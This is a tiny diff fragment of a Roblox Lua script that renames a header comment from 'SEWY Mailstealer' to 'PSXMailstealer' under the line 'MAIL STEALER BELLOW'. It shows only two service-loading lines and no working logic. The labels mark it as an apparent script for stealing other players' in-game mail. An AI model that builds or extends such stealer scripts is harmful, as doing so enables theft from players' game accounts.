@@ -1,6 +1,6 @@
 -- MAIL STEALER BELLOW
 
--- [SEWY Mailstealer]
+-- [PSXMailstealer]
 
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
